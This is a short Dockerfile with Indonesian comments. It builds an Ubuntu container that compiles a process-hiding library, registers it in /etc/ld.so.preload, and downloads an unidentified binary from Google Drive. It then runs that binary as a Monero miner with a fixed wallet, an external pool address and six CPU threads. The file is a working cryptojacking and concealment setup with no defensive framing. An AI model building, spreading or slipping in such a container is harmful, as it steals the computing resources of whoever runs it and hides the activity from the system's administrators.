# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, compiler gcc, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget gcc

# Buat direktori untuk meletakkan file-file yang dibutuhkan
WORKDIR /myapp

# Download processhider.c
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c

# Compile processhider.c dan pindahkan libprocess.so
RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download config.json dan durex, serta memberikan izin eksekusi pada durex
RUN wget -O durex "https://drive.google.com/uc?export=download&id=1g9IoCBMXlA_K3GDNBwULac_N9FlK2_Ce" && chmod +x durex
    

# Perintah yang akan dijalankan saat container pertama kali dijalankan
# Ganti perintah ini sesuai dengan kebutuhan Anda
CMD ["./durex -algo RandomX -coin XMR -wallet 86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB.x3 -pool1 158.69.251.105:4050 -cpuThreads 6"]
